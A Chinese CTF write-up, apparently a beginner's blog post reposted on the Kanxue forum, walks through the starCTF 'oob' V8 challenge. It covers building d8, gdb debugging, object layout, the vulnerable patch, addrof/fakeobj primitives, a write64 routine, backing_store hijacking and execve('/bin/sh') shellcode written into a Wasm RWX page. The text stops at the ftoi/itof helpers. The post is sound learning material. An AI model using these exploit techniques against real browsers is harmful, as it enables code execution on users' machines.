> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.kanxue.com](https://bbs.kanxue.com/thread-292975.htm#msg_header_h2_12)

> 看雪安全社区是一个非营利性质的技术交流平台，致力于汇聚全球的安全研究者和开发者，专注于软件与系统安全、逆向工程、漏洞研究等领域的深度技术讨论与合作。

本文首发于我的个人博客  
[https://ghostshark-pro.github.io/2026/09/17/starctf%20oob/](https://ghostshark-pro.github.io/2026/09/17/starctf%20oob/)  
现在根本不知道 v8 是怎么调试的，先通过知道创宇的 starctf oob 入门一下

原文作者选择在 win 上用 WSL 编译，笔者因为电脑比较得劲就开个 ubuntu 编译

分配了 12G 内存、16 核，time autoninja 看了一下大概 9min 就好了

这里得先装一个 git

然后装 depot_tools

```
cd ~

git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git

export PATH="$HOME/depot_tools:$PATH"
```

我们用 fetch v8 会拉下 v8 源码后直接创一个 v8 目录，不用特地 mkdir v8

随后

```
./build/install-build-deps.sh
```

这个可以自动装一些小工具

gclient sync 下载依赖

```
$ gn gen out/x64.release --args='放编译参数，正常会给args.gn'
```

![](https://bbs.kanxue.com/upload/attach/202609/1075564_KHN2DY8FA3765Q9.webp)  
用 autoninja -C out/x64.release d8 编译，前面加个 time 可以算时间

![](https://bbs.kanxue.com/upload/attach/202609/1075564_V92ZH6N4TFD3K5E.webp)

如果题目给了 commit，可以在 gclient sync 之前

git reset --hard 5a2307d0f2c5b650c6858e2b9b57b335a59946ff（这个会把修改切没掉，只切版本的话就用 git checkout）

推荐用 gclient sync -D，可以把不需要的依赖删掉

![](https://bbs.kanxue.com/upload/attach/202609/1075564_465BATAH2QA9DJ6.webp)  
如果题目提供了 patch 就在 gclient sync -D 后打一下 git apply < ./patch

原文出于方便编译任意版本的目的写了 build.sh，不过对于初学者来说还是先手搓好

这部分属于额外环境封装，跳过

在正常做 ctf 时一般都有一个明确的目标，拿 shell 或者 orw，原文认为在 v8 中的目标就是执行任意 shellcode

首先把 v8/tools/gdbinit 加入到~/.gdbinit 中

![](https://bbs.kanxue.com/upload/attach/202609/1075564_EJUX9FKEHFCGPVP.webp)  
这样在用 gdb 启动 d8 时就能用 v8 的调试指令

接下来在 d8 目录中 vim 一个 test.js

![](https://bbs.kanxue.com/upload/attach/202609/1075564_J8SSQ4GRGVPG3YK.webp)

![](https://bbs.kanxue.com/upload/attach/202609/1075564_7PY8N3HDFE8568Q.webp)  
这里得加入 --allow-natives-syntax，d8 里没有 % 这种东西

![](https://bbs.kanxue.com/upload/attach/202609/1075564_9XE6T4V4V325B9J.webp)  
%DebugPrint() 打印对象在 v8 内的表示

这里的 prototype 表示原型对象，JavaScript 对象找不到某个属性时，会沿着 `prototype` 链继续往上找

[PACKED_SMI_ELEMENTS (COW)] COW 表示 copy on write，写时复制

![](https://bbs.kanxue.com/upload/attach/202609/1075564_DJYMPSAHCCS7G66.webp)  
map 本身也是 v8 heapobject，所以 map 也有 map

普通 JS 对象的类型信息 → Map

Map 自己的类型信息 → MetaMap

properties = 按名字访问

elements = 按数字下标访问

tagged pointer : 因为堆对象地址按字节对齐，最低几位本来通常是 0，V8 就拿这些位来区分 “这是整数还是堆对象指针”

最低位 = 0 → Smi 小整数

最低位 = 1 → HeapObject 指针

![](https://bbs.kanxue.com/upload/attach/202609/1075564_73M7YKZ6VJS8XBZ.webp)  
gdb 进入 d8 后用 r --allow-natives-syntax test.js 运行 js 命令

![](https://bbs.kanxue.com/upload/attach/202609/1075564_7BPVZ4ZDFQHTWPW.webp)  
这样就方便用 gdb 看内存了

前面提到了 v8 的 gdbinit, 里面给 gdb 加了一些辅助调试命令，job 就跟 %DebugPrint() 差不多

不过这里得注意一下

因为 `job` 操作的是 **V8 的 Tagged Pointer**，而 “真实地址” 是**去掉 tag 后的对象起始地址**

所以 job 后面的参数为真实地址 + 1

如果启用了 Pointer Compression，还可能再多一层压缩指针到完整地址的转换

![](https://bbs.kanxue.com/upload/attach/202609/1075564_NU7UYJRAWC6BTDG.webp)  
如果参数是真实地址，会被解析成 Smi

Wasm（WebAssembly）是一种**面向虚拟机的二进制指令格式**，主要目的是让 C/C++、Rust 等现有代码能进入 web，而不是得全部重写成 JS

v8 可以把这种二进制指令格式编译成机器码执行

```
C / C++ / Rust
      │
      │ 编译
      ▼
   WebAssembly
    (.wasm)
      │
      ▼
Chrome / V8 / Firefox / Wasmtime
      │
      ▼
   机器码执行
```

JS 调用 wasm（一般就是通过浏览器提供的 `WebAssembly` API）常常是为了把高性能或者底层任务交给 wasm

基本现代浏览器都支持 wasm，老 v8 会生成一段 rwx 内存给 wasm 用，现代就复杂一点

vim 一个 js 看看

![](https://bbs.kanxue.com/upload/attach/202609/1075564_J29ZTSZFUU35USS.webp)

```
%SystemBreak();
var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);

var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var f = wasmInstance.exports.main;
%DebugPrint(f);
%DebugPrint(wasmInstance);
%SystemBreak();
```

我们先看看这个无符号 8 位整数 array 表示了什么

`Uint8Array` 里面每个数字都是一个字节，整体就是一个 `.wasm` 文件的原始二进制内容

等价于

```
(module
  (type $t0 (func (result i32)))

  (func $main (type $t0) (result i32)
    i32.const 42
  )

  (table 0 funcref)

  (memory 1)

  (export "memory" (memory 0))
  (export "main" (func 0))
)
```

memory（）导出一块 Wasm Linear Memory

main（）return 42

wasmModule 这一步是将 wasmCode 转化成 v8 可以识别的程序模板（Module 可便于创建多个独立运行的实例）

wasmInstance 真正实例化

var f = wasmInstance.exports.main;

从 `wasmInstance` 导出的内容里，取出名为 `main` 的 Wasm 函数，然后保存到变量 `f`

wasmInstance.exports 表示这个 Wasm 实例对 JS 暴露出来的所有东西（memory、main）

![](https://bbs.kanxue.com/upload/attach/202609/1075564_D6SNF3YAHVUXJV7.webp)  
在第二个断点处我们发现它生成了一段 rwx

现在的问题变成我们如何得到该地址

先看看 %DebugPrint(f) 输出了什么

![](https://bbs.kanxue.com/upload/attach/202609/1075564_48A7C7X4NEDPZN8.webp)  
可以看出这是一个函数对象

![](https://bbs.kanxue.com/upload/attach/202609/1075564_FG8YARXMVA9EWUM.webp)  
`SharedFunctionInfo`，简称 **SFI**，保存函数相对静态的元数据

![](https://bbs.kanxue.com/upload/attach/202609/1075564_FQS2JHPWEUR73T4.webp)  
用 job 查看 shared_info

![](https://bbs.kanxue.com/upload/attach/202609/1075564_NF26ZZV2VQ69EDT.webp)  
查看 data 结构

![](https://bbs.kanxue.com/upload/attach/202609/1075564_AEARGZWBGZKK2MZ.webp)  
看看 instance

![](https://bbs.kanxue.com/upload/attach/202609/1075564_D4BKQ86NCFFR4PW.webp)

![](https://bbs.kanxue.com/upload/attach/202609/1075564_6WUXFKFMPE55K5U.webp)  
注意到该地址与 WasmInstanceObject 重合

原文的 rwx 在 instance+68，我这里编译出来的 d8 是 12.8（开了 sandbox），用 jump table 能找出来，原文 instance 那还真没有

![](https://bbs.kanxue.com/upload/attach/202609/1075564_SZCJ8ETE9G9BBQR.webp)

![](https://bbs.kanxue.com/upload/attach/202609/1075564_JZBN3G5Y5WVCNR8.webp)  
在 12.8.0 中 WasmTrustedInstanceData 的 trusted_data + 0x38 处

现在的目的就是把 shellcode 写进 wasm 的 rwx 段然后执行

先看看两种变量类型的结构

![](https://bbs.kanxue.com/upload/attach/202609/1075564_CJ9J84Q342JBYNF.webp)  
![](https://bbs.kanxue.com/upload/attach/202609/1075564_WVKU8PVBZXTRDZB.webp)

```
DebugPrint: 0x36e100047ff9: [JSArray]
  - map: 0x36e10018cd1d <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
  - prototype: 0x36e10018c691 <JSArray[0]>
  - elements: 0x36e100047fe9 <FixedDoubleArray[1]> [PACKED_DOUBLE_ELEMENTS]
  - length: 1
  - properties: 0x36e100000725 <FixedArray[0]>
  - All own properties (excluding elements): {
  0x36e100000d99: [String] in ReadOnlySpace: #length: 0x36e10028827d <AccessorInfo name= 0x36e100000d99 <String[6]: #length>, data= 0x36e100000069 <undefined>> (const accessor descriptor, attrs: [W__]), location: descriptor
}
- elements: 0x36e100047fe9 <FixedDoubleArray[1]> {
  0: 2.1
}
0x36e10018cd1d: [Map] in OldSpace
  - map: 0x36e1001816d9 <MetaMap (0x36e100181729 <NativeContext[295]>)>
  - type: JS_ARRAY_TYPE
  - instance size: 16
  - inobject properties: 0
  - unused property fields: 0
  - elements kind: PACKED_DOUBLE_ELEMENTS
  - enum length: invalid
  - back pointer: 0x36e10018ccdd <Map[16](HOLEY_SMI_ELEMENTS)>
  - prototype_validity cell: 0x36e100000a89 <Cell value= 1>
  - instance descriptors #1: 0x36e10018cca9 <DescriptorArray[1]>
  - transitions #1: 0x36e10018cd45 <TransitionArray[4]>
  Transition array #1:
0x36e100000e5d <Symbol: (elements_transition_symbol)>: (transition to HOLEY_DOUBLE_ELEMENTS) -> 0x36e10018cd5d <Map[16](HOLEY_DOUBLE_ELEMENTS)>
  - prototype: 0x36e10018c691 <JSArray[0]>
  - constructor: 0x36e10018c389 <JSFunction Array (sfi = 0x36e10028d6cd)>
  - dependent code: 0x36e100000735 <Other heap object (WEAK_ARRAY_LIST_TYPE)>
  - construction counter: 0
```

```
pwndbg> x/8gx 0x36e100047ff9-1
0x36e100047ff8:	0x000007250018cd1d	0x0000000200047fe9
0x36e100048008:	0x00000725001985e9	0x0000000200000725
0x36e100048018:	0x0001000100000685	0x0000074d00000000
0x36e100048028:	0x0000008400002b09	0x0000056d00000002
pwndbg> x/8gx 0x36e100047fe9-1
0x36e100047fe8:	0x00000002000008a9	0x4000cccccccccccd
0x36e100047ff8:	0x000007250018cd1d	0x0000000200047fe9
0x36e100048008:	0x00000725001985e9	0x0000000200000725
0x36e100048018:	0x0001000100000685	0x0000074d00000000
```

内存大概长这样

注意到这里开了**指针压缩**，很多字段只有 `4 bytes`

```
cage base = 0x36e100000000

              FixedDoubleArray
0x...47fe8 ┌────────────────────────────┐
           │ map    = 0x000008a9        │ 4B
           │ length = 0x00000002 Smi(1) │ 4B
0x...47ff0 │ 0x4000cccccccccccd         │ 8B
           │          = 2.1             │
           └────────────────────────────┘

                    JSArray
0x...47ff8 ┌────────────────────────────┐
           │ map = 0x0018cd1d           │ 4B
           │ properties = 0x00000725    │ 4B
0x...48000 │ elements = 0x00047fe9      │ 4B
           │ length = 0x00000002 Smi(1) │ 4B
           └────────────────────────────┘
0x...48008       下一个 HeapObject
```

注意到这一次`a` 的 `FixedDoubleArray` backing store 恰好位于 `a` 对象之前。如果漏洞允许对该 backing store 进行越界读写，那么越过其末尾后，就可能访问相邻堆对象的 `map`、`properties`、`elements`、`length`

![](https://bbs.kanxue.com/upload/attach/202609/1075564_W6M98C5UA8XWBE8.webp)  
这里是因为压缩指针下 Smi 只有 31 位且强制 `值<<1`(最低位必须为 0), 塞不进任意 64 位值，读出来也被抹掉最低位

```
DebugPrint: 0x36e100048009: [JS_OBJECT_TYPE]
 - map: 0x36e1001985e9 <Map[16](HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x36e100182611 <Object map = 0x36e100181c25>
 - elements: 0x36e100000725 <FixedArray[0]> [HOLEY_ELEMENTS]
 - properties: 0x36e100000725 <FixedArray[0]>
 - All own properties (excluding elements): {
    0x36e100002b09: [String] in ReadOnlySpace: #a: 1 (const data field 0, attrs: [WEC]) @ Any, location: in-object
 }
0x36e1001985e9: [Map] in OldSpace
 - map: 0x36e1001816d9 <MetaMap (0x36e100181729 <NativeContext[295]>)>
 - type: JS_OBJECT_TYPE
 - instance size: 16
 - inobject properties: 1
 - unused property fields: 0
 - elements kind: HOLEY_ELEMENTS
 - enum length: invalid
 - stable_map
 - back pointer: 0x36e1001985c1 <Map[16](HOLEY_ELEMENTS)>
 - prototype_validity cell: 0x36e100000a89 <Cell value= 1>
 - instance descriptors (own) #1: 0x36e100048019 <DescriptorArray[1]>
 - prototype: 0x36e100182611 <Object map = 0x36e100181c25>
 - constructor: 0x36e100182139 <JSFunction Object (sfi = 0x36e10028cc7d)>
 - dependent code: 0x36e100000735 <Other heap object (WEAK_ARRAY_LIST_TYPE)>
 - construction counter: 0

DebugPrint: 0x36e100048041: [JSArray]
 - map: 0x36e10018cd9d <Map[16](PACKED_ELEMENTS)> [FastProperties]
 - prototype: 0x36e10018c691 <JSArray[0]>
 - elements: 0x36e100048035 <FixedArray[1]> [PACKED_ELEMENTS]
 - length: 1
 - properties: 0x36e100000725 <FixedArray[0]>
 - All own properties (excluding elements): {
    0x36e100000d99: [String] in ReadOnlySpace: #length: 0x36e10028827d <AccessorInfo name= 0x36e100000d99 <String[6]: #length>, data= 0x36e100000069 <undefined>> (const accessor descriptor, attrs: [W__]), location: descriptor
 }
 - elements: 0x36e100048035 <FixedArray[1]> {
           0: 0x36e100048009 <Object map = 0x36e1001985e9>
 }
0x36e10018cd9d: [Map] in OldSpace
 - map: 0x36e1001816d9 <MetaMap (0x36e100181729 <NativeContext[295]>)>
 - type: JS_ARRAY_TYPE
 - instance size: 16
 - inobject properties: 0
 - unused property fields: 0
 - elements kind: PACKED_ELEMENTS
 - enum length: invalid
 - back pointer: 0x36e10018cd5d <Map[16](HOLEY_DOUBLE_ELEMENTS)>
 - prototype_validity cell: 0x36e100000a89 <Cell value= 1>
 - instance descriptors #1: 0x36e10018cca9 <DescriptorArray[1]>
 - transitions #1: 0x36e10018cdc5 <TransitionArray[4]>
   Transition array #1:
     0x36e100000e5d <Symbol: (elements_transition_symbol)>: (transition to HOLEY_ELEMENTS) -> 0x36e10018cddd <Map[16](HOLEY_ELEMENTS)>
 - prototype: 0x36e10018c691 <JSArray[0]>
 - constructor: 0x36e10018c389 <JSFunction Array (sfi = 0x36e10028d6cd)>
 - dependent code: 0x36e100000735 <Other heap object (WEAK_ARRAY_LIST_TYPE)>
 - construction counter: 0
```

let b = {"a": 1};

let c = [b];

变量 `c` 是一个数组，数组里唯一的元素就是对象 `b`

```
pwndbg> job 0x36e100048035
0x36e100048035: [FixedArray]
 - map: 0x36e10000056d <Map(FIXED_ARRAY_TYPE)>
 - length: 1
           0: 0x36e100048009 <Object map = 0x36e1001985e9>
pwndbg> x/8gx 0x36e100048041-1
0x36e100048040:	0x000007250018cd9d	0x0000000200048035
0x36e100048050:	0x0000000000000000	0x0000000000000000
0x36e100048060:	0x0000000000000000	0x0000000000000000
0x36e100048070:	0x0000000000000000	0x0000000000000000
pwndbg> x/8gx 0x36e100048035-1
0x36e100048034:	0x000000020000056d	0x0018cd9d00048009
0x36e100048044:	0x0004803500000725	0x0000000000000002
0x36e100048054:	0x0000000000000000	0x0000000000000000
0x36e100048064:	0x0000000000000000	0x0000000000000000
```

变量 `c` 和变量 `a` 本身都是 `JSArray`，因此 JSArray 对象头的结构基本相同。区别主要在 `elements` 指向的 backing store。`a` 是 `PACKED_DOUBLE_ELEMENTS`，使用 `FixedDoubleArray`，其中每个元素直接保存一个 64-bit double；`c` 是 `PACKED_ELEMENTS`，使用 `FixedArray`，其中对象元素以 Tagged Pointer 保存。在开启 Pointer Compression 的情况下，这些 Tagged Pointer 被压缩为 32 bit，因此 `c` 的每个元素槽位是 32 bit

我们看看 V8 利用里最经典的两个原语：

*   `addressOf / addrof`：**对象 → 地址**
*   `fakeObj / fakeobj`：**地址 → 对象**

Map 中的 ElementsKind 决定 V8 用什么方式解释 `elements` 里的 bit

```
a.map → PACKED_DOUBLE_ELEMENTS
a.elements:
| map | length | 64-bit IEEE754 double |

c.map → PACKED_ELEMENTS
c.elements:
| map | length | 32-bit compressed Tagged Pointer | ...
```

内存本身只是一堆 bit。真正决定这 32/64 bit 到底应该被当成 double，还是对象引用的是 `Map → ElementsKind`

如果把变量`c`的 map 地址改成变量`a`的，那么当执行`c[0]`的时候，获取到的就是变量`b`的地址

这就是 addrof 函数的目的

fakeobj: 把浮点数组伪装成对象数组

**漏洞本身只负责一件事：改写某个 JSArray 的 map 字段**

具体漏洞 (OOB / UAF / 类型混淆) 唯一要求: 能把某个 JSArray 的 map 改成另一种数组的 map

<table><thead><tr><th></th><th>对象数组 (PACKED_ELEMENTS)</th><th>double 数组 (PACKED_DOUBLE_ELEMENTS)</th></tr></thead><tbody><tr><td>元素在内存中的形态</td><td>32 位压缩指针 (最低位 tag=1)</td><td>64 位原始值，无任何 tag</td></tr><tr><td>读 arr[0] 时引擎做什么</td><td>解引用：当指针解析，返回一个对象句柄</td><td>原样返回这 8 个字节，不解释、不追踪</td></tr><tr><td>GC 怎么对待内容</td><td>逐个扫描、按对象移动更新</td><td>完全不理会，GC 不会扫 FixedDoubleArray 的内容</td></tr></tbody></table>

之后的利用链全部固定：map 混淆 → `addrof`/`fakeObj` 原语 → 任意读写 → 劫持 `backing_store` → 写 WASM RWX 页 → 触发执行

[触发层] 漏洞 → JSArray 元数据可控 (map / length / elements)

[原语层] addrof ⇄ fakeobj(同一操作的镜像)→ fake_array+fake_object → read64/write64

[执行层] 改 ArrayBuffer.backing_store → DataView 写 shellcode → 调 wasm 导出函数

```
function write64(addr, data)
{
    fake_array[1] = itof(addr - 0x8n + 0x1n); // ① 伪造 elements 指针
    fake_object[0] = itof(data);  // ②③ 引擎按 double 数组语义写入
}
```

由 fake_array 和 fake_object 构造的 write64 不能直接把 shellcode 写入 rwx

elements 字段只有 32 位，解压规则是固定拼接 cage base，最主要的原因就是 rwx 段在解压缩指针的 4GB 范围内不可达

![](https://bbs.kanxue.com/upload/attach/202609/1075564_WNPHH6QKDHC7JQP.webp)  
write64 的目标地址前面 8 字节 ** 必须可读且内容凑合合法，** 而 RWX 段起始地址的前 8 字节 (`rwx−8`) 落在映射之外 (未映射页 / 保护区域)，第一次解引用就段错误

`f()` 的调用落点固定在 RWX 区域入口，rwx+8 也不可取

先 vim 一下

![](https://bbs.kanxue.com/upload/attach/202609/1075564_CRFGMWC3WTRMQZP.webp)  
程序先申请了一块 **16 字节的小内存**，叫 `data_buf`。

然后又创建了一个 `DataView`，专门用来读写这块内存。

接着程序通过这个工具，把数字 `2.0` 写到这块内存的最开头，占用前 8 个字节

```
DebugPrint: 0x1db000048039: [JSArrayBuffer]
 - map: 0x1db000189c91 <Map[52](HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x1db000189e25 <Object map = 0x1db000189cb9>
 - elements: 0x1db000000725 <FixedArray[0]> [HOLEY_ELEMENTS]
 - cpp_heap_wrappable: 0
 - backing_store: 0x1db100000000
 - byte_length: 16
 - max_byte_length: 16
 - detach key: 0x1db000000069 <undefined>
 - detachable
 - properties: 0x1db000000725 <FixedArray[0]>
 - All own properties (excluding elements): {}
0x1db000189c91: [Map] in OldSpace
 - map: 0x1db0001816d9 <MetaMap (0x1db000181729 <NativeContext[295]>)>
 - type: JS_ARRAY_BUFFER_TYPE
 - instance size: 52
 - inobject properties: 0
 - unused property fields: 0
 - elements kind: HOLEY_ELEMENTS
 - enum length: invalid
 - stable_map
 - back pointer: 0x1db000000069 <undefined>
 - prototype_validity cell: 0x1db000000a89 <Cell value= 1>
 - instance descriptors (own) #0: 0x1db000000759 <DescriptorArray[0]>
 - prototype: 0x1db000189e25 <Object map = 0x1db000189cb9>
 - constructor: 0x1db000189c41 <JSFunction ArrayBuffer (sfi = 0x1db000291bfd)>
 - dependent code: 0x1db000000735 <Other heap object (WEAK_ARRAY_LIST_TYPE)>
 - construction counter: 0

DebugPrint: 0x1db00004806d: [JSDataView]
 - map: 0x1db000187561 <Map[48](HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x1db000187781 <Object map = 0x1db000187589>
 - elements: 0x1db000000725 <FixedArray[0]> [HOLEY_ELEMENTS]
 - buffer =0x1db000048039 <ArrayBuffer map = 0x1db000189c91>
 - byte_offset: 0
 - byte_length: 16
 - properties: 0x1db000000725 <FixedArray[0]>
 - All own properties (excluding elements): {}
0x1db000187561: [Map] in OldSpace
 - map: 0x1db0001816d9 <MetaMap (0x1db000181729 <NativeContext[295]>)>
 - type: JS_DATA_VIEW_TYPE
 - instance size: 48
 - inobject properties: 0
 - unused property fields: 0
 - elements kind: HOLEY_ELEMENTS
 - enum length: invalid
 - stable_map
 - back pointer: 0x1db000000069 <undefined>
 - prototype_validity cell: 0x1db000000a89 <Cell value= 1>
 - instance descriptors (own) #0: 0x1db000000759 <DescriptorArray[0]>
 - prototype: 0x1db000187781 <Object map = 0x1db000187589>
 - constructor: 0x1db00018752d <JSFunction DataView (sfi = 0x1db000292b5d)>
 - dependent code: 0x1db000000735 <Other heap object (WEAK_ARRAY_LIST_TYPE)>
 - construction counter: 0
```

这里有一个跟原文不一样的地方，原文没开 sandbox，backing store 是 malloc 原生堆的裸指针

我这里编译开了 sandbox

<table><thead><tr><th>对象</th><th>地址</th><th>说明</th></tr></thead><tbody><tr><td>JSArrayBuffer 本体</td><td>0x1db0_00048039</td><td>在 4GB 指针笼内 (基址 0x1db_00000000)</td></tr><tr><td>backing_store 指向</td><td>0x1db1_00000000</td><td>恰好 = 笼基址 + 4GB</td></tr></tbody></table>

![](https://bbs.kanxue.com/upload/attach/202609/1075564_MFSA4X3U6VBYPSR.webp)

![](https://bbs.kanxue.com/upload/attach/202609/1075564_WW2ECXEB6P2X8NV.webp)  
double 型的 2.0 就是 0x4000000000000000

![](https://bbs.kanxue.com/upload/attach/202609/1075564_B98VTRPCTUSUHAN.webp)  
可以看处 data_buf 的值存储在一段连续的地址中

原文的思路是通过修改`backing_store`字段的值为 rwx 内存地址，来达到写`shellcode`的目的

![](https://bbs.kanxue.com/upload/attach/202609/1075564_9H6VHTPN4RYQG5A.webp)  
我们发现 backing_store 那 8 字节存的不是 `0x1db100000000` 本身

```
真实地址
0x1db100000000

        ↓ 减 sandbox base

offset = 0x1db100000000 - 0x1db000000000
       = 0x100000000

        ↓ 左移 24 bit

raw = 0x100000000 << 24
    = 0x0100000000000000
```

这里还想 copy_shellcode_to_rwx 就得打 sandbox escape 了

```
var shellcode = [
  0x2fbb485299583b6an,
  0x5368732f6e69622fn,
  0x050f5e5457525f54n   //execve(/bin/sh,0,0)
];
copy_shellcode_to_rwx(shellcode, rwx_page_addr);
f();
```

通过 f（）执行 shellcode

[](https://bbs.kanxue.com/elink@b46K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6X3j5i4u0S2P5W2)9J5k6h3k6S2K9i4c8Z5i4K6u0r3x3U0l9I4z5g2)9J5k6o6p5J5i4K6u0V1x3e0y4Q4x3X3c8K6N6r3q4J5j5%4c8X3i4K6u0V1L8$3!0T1i4K6u0V1N6U0S2Q4x3X3c8A6L8X3c8W2M7s2c8Z5i4K6u0r3)https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/

这里有完整的 patch

```
git reset --hard 6dc88c191f5ecc5389dc26efa3ca0907faef3598
gclient sync -D
cd ..
vim oob.diff
cd v8
git apply ../oob.diff
python2 build/linux/sysroot_scripts/install-sysroot.py --arch=amd64
```

这里编译的时候遇到一个问题，v8 的版本太老得用到 python2，但 apt 不提供了，只能开个 docker 了

```
docker run -it \
  --name v8-startctf \
  -v ~/v8:/work \
  ubuntu:20.04 \
  bash
apt update
apt install -y python2 git curl ca-certificates build-essential
```

![](https://bbs.kanxue.com/upload/attach/202609/1075564_CU8MP6EKX3Q2X9Y.webp)

![](https://bbs.kanxue.com/upload/attach/202609/1075564_YBE2PW8YK8WEEHJ.webp)

```
python build/linux/sysroot_scripts/install-sysroot.py --arch=amd64
apt install -y pkg-config
./buildtools/linux64/gn gen out.gn/x64_startctf.release --args='
v8_monolithic=true
v8_use_external_startup_data=false
is_component_build=false
is_debug=false
target_cpu="x64"
use_goma=false
goma_dir="None"
v8_enable_backtrace=true
v8_enable_disassembler=true
v8_enable_object_print=true
v8_enable_verify_heap=true
treat_warnings_as_errors=false
'
apt install -y ninja-build
time ninja -C out.gn/x64_startctf.release d8
```

![](https://bbs.kanxue.com/upload/attach/202609/1075564_Y2NUVADSS2RY8RR.webp)  
还挺快

![](https://bbs.kanxue.com/upload/attach/202609/1075564_B5RF9UK69SXZWQW.webp)  
记得把没用的 docker 删掉

先看看 patch

```
diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc
index b027d36..ef1002f 100644
--- a/src/bootstrapper.cc
+++ b/src/bootstrapper.cc
@@ -1668,6 +1668,8 @@ void Genesis::InitializeGlobal(Handle<JSGlobalObject> global_object,
                           Builtins::kArrayPrototypeCopyWithin, 2, false);
     SimpleInstallFunction(isolate_, proto, "fill",
                           Builtins::kArrayPrototypeFill, 1, false);
+    SimpleInstallFunction(isolate_, proto, "oob",
+                          Builtins::kArrayOob,2,false);
     SimpleInstallFunction(isolate_, proto, "find",
                           Builtins::kArrayPrototypeFind, 1, false);
     SimpleInstallFunction(isolate_, proto, "findIndex",
diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
index 8df340e..9b828ab 100644
--- a/src/builtins/builtins-array.cc
+++ b/src/builtins/builtins-array.cc
@@ -361,6 +361,27 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,
   return *final_length;
 }
 }  // namespace
+BUILTIN(ArrayOob){
+    uint32_t len = args.length();
+    if(len > 2) return ReadOnlyRoots(isolate).undefined_value();
+    Handle<JSReceiver> receiver;
+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+            isolate, receiver, Object::ToObject(isolate, args.receiver()));
+    Handle<JSArray> array = Handle<JSArray>::cast(receiver);
+    FixedDoubleArray elements = FixedDoubleArray::cast(array->elements());
+    uint32_t length = static_cast<uint32_t>(array->length()->Number());
+    if(len == 1){
+        //read
+        return *(isolate->factory()->NewNumber(elements.get_scalar(length)));
+    }else{
+        //write
+        Handle<Object> value;
+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+                isolate, value, Object::ToNumber(isolate, args.at<Object>(1)));
+        elements.set(length,value->Number());
+        return ReadOnlyRoots(isolate).undefined_value();
+    }
+}

 BUILTIN(ArrayPush) {
   HandleScope scope(isolate);
diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h
index 0447230..f113a81 100644
--- a/src/builtins/builtins-definitions.h
+++ b/src/builtins/builtins-definitions.h
@@ -368,6 +368,7 @@ namespace internal {
   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \
   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \
   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \
+  CPP(ArrayOob)                                                                \
                                                                                \
   /* ArrayBuffer */                                                            \
   /* ES #sec-arraybuffer-constructor */                                        \
diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
index ed1e4a5..c199e3a 100644
--- a/src/compiler/typer.cc
+++ b/src/compiler/typer.cc
@@ -1680,6 +1680,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
       return Type::Receiver();
     case Builtins::kArrayUnshift:
       return t->cache_->kPositiveSafeInteger;
+    case Builtins::kArrayOob:
+      return Type::Receiver();

     // ArrayBuffer functions.
     case Builtins::kArrayBufferIsView:
```

![](https://bbs.kanxue.com/upload/attach/202609/1075564_R3DAHX934XTTBNH.webp)  
给所有 JavaScript 数组的原型 `Array.prototype` 新增了一个叫 `oob` （out of bounds）的方法，传入两个参数

也就是 JS 里能这么调

```
let a = [1.1, 2.2, 3.3];
a.oob();        // 读
a.oob(1.337);   // 写
```

![](https://bbs.kanxue.com/upload/attach/202609/1075564_V5GN5NFW98E8KXC.webp)  
定义内置函数 ArrayOob(),ArrayOob 能调用 isolate（当前实例）跟 args（调用参数）变量

uint32_t len = args.length(); 取本次参数调用个数（args[0]->this 也算一个），故 arr.oob(x)->length == 2，len>2 时直接 return underfined

JSReceiver 表示 V8 里 “可以接收属性访问的 JS 对象” 的基类

```
{}
[]
function(){}
new Date()
```

例如这些

Handle

表示一个由 V8 GC 管理的 `JSReceiver` 引用，receiver 是变量名

`args.receiver()`：拿到当前函数调用里的 **receiver，也就是 **`**this**`

然后把 JSReceiver 转化成 JSArray 类型的 Handle

取内存，转化成 FixedDoubleArray，取 length 转化成 number

接下来是个条件分支，len =1 read，len = 2 write

*   ```
    return *(isolate->factory()->NewNumber(elements.get_scalar(length)));
    ```
    

这一块实际上最后一个元素应该是 length-1, 这里正好能越界访问一个元素

*   ```
    elements.set(length,value->Number());
    ```
    

相当于 elements[length] = value;

oob 方法相当于提供一个 8 字节的越界读写

JS 是不能直接读 addr 的，但通过类型混淆可以让 v8 将一个 addr pointer 所在 8 字节当成 double 数组里的浮点数读出来

首先构造 froi() 跟 itof() 函数转化再 JS 里的数据表示

ftoi(float) -> BigInt：把泄露出来的 double 还原成 64-bit 整数地址

itof(BigInt) -> float：把想写入的 64-bit 地址伪装成 double 写回内存

等于是同一块内存不同的解释方式

```
var buf = new ArrayBuffer(8)
var f64_buf = new Float64Array(buf)
var u32_buf = new Uint32Array(buf)

function ftoi(val){   // float to BigInt
  f64_buf[0] = val;
  return BigInt(u32_buf[0]) + (BigInt(u32_buf[1]) << 32n);
}
function itof(val){   // BigInt to float
  u32_buf[0] = Number(val & 0xffffffffn);
  u32_buf[1] = Number(val >> 32n);
  return f64_buf[0];
}
```

f64 与 u32 共享 buf，但对数据的解释方式不一样

